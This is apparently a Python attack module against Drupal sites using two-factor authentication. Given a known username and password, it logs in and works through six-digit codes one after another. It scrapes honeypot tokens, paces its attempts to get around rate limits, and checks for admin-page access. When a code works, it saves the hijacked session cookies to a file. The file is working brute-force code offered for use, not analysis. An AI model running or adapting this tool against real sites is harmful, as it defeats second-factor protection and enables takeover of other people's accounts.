import re
import requests as req
from time import sleep, time
from lib.requester import srequester

class tfabrute:
    # MODULE REQUIREMENTS
    ## uname - username of account to auth against
    ## passwd - password for the account to auth against
    ## ratelimt - any ratelimits to abide by (in ms) (MAY MOVE RATE LIMIT TO GLOBAL SCOPE LATER)
    def __init__(self, uname, passwd, requestor, login='/user/login', ratelimit=0):
        self.uname = uname
        self.passwd = passwd
        self.ratelimit = ratelimit
        self.requestor = requestor
        self.login = login

        self.resource_loc = do_auth(self.requestor, self.uname, self.passwd, self.login)

    ## Large ammount of request overhead - could be simplified with better session management ##
    def tfabrute(self, permin=5, fileout='./out.txt'):
        # gen list of codes to test
        codes = [ f'{i:06d}' for i in range(0,999999) ]
        otime = time()
        for i, code in enumerate(codes):
            # create new session request object - this would be to avoid accidental polution
            # supports fast init with basic params only - extend if needed
            r = srequester(self.requestor.hostname)
            r.quick_init()
            retcode = send_code(r, code, do_auth(r, self.uname, self.passwd, self.login))
            if retcode is not None:
                print("[*] TFA brute force successful [*]")
                print("CODE: {}\nSESSION DETAILS: {}".format(code, retcode))
                with open(fileout, 'w') as f:
                    f.write("CODE: {}\nSESSION DETAILS: {}".format(code, retcode))
                
            if i % permin == 0:
                print("progress - {} / 999999".format(str(i)))
                diff = time() - otime 
                wait_time = 61 - diff 
                sleep(wait_time)
                otime = time()
        pass

    def expose_code(self, code):
        send_code(self.requestor, code, self.resource_loc)


def send_code(r, code, endpoint, delay=5):
    add_headers = {'Content-Type': "application/x-www-form-urlencoded"}
    honey_time_rex = re.compile(r'<input data-drupal-selector="edit-honeypot-time" type="hidden" name="honeypot_time" value="(?P<honeytime>[^\"]+)\"')
    hpt_content = r.get(path=endpoint)
    httoken = honey_time_rex.search(hpt_content.content.decode('utf8'))
    if httoken is not None:
        tfa_payload = {'code': code, 'form_id': "tfa_entry_form", 'honeypot_time': httoken.group('honeytime'), 'op': "Verify", 'url': ""}
    else:
        tfa_payload = {'code': code, 'form_id': "tfa_entry_form", 'op': "Verify"}
    
    sleep(delay)
    
    v = r.post(path=endpoint, data=tfa_payload, additional_headers=add_headers)
    q = r.get(path='/?check_logged_in=1')

    if r.get(path='/admin/people').status_code == 200:
        return q.cookies.get_dict()
    
    return

        
def do_auth(r, uname, passwd, login):
    add_headers = {'Content-Type': "application/x-www-form-urlencoded"}
    if r.get(path=login).status_code == 200:
        auth_payload = {'name': uname, 'pass': passwd, 'form_id': 'user_login_form', 'op': 'Log+in'}
        v = r.post(path=login, data=auth_payload, additional_headers=add_headers)
        if v.status_code == 200:
            form_rex = re.compile(r'<form class=\"tfa-entry-form\" data-drupal-selector\=\"tfa-entry-form\" action\=\"(?P<resource_location>[^\"]+)\" method\=\"post\" id=\"tfa-entry-form\" accept-charset=\"UTF-8\">')
            c = form_rex.search(v.content.decode('utf8'))
            if c is not None: 
                resource_loc = c.group('resource_location')
                return resource_loc
            else:
                print("[!] Error - incorrect credentials [!]")
                return -1
        else: 
            return -1
    else: 
        raise Exception("Login page does not exist")


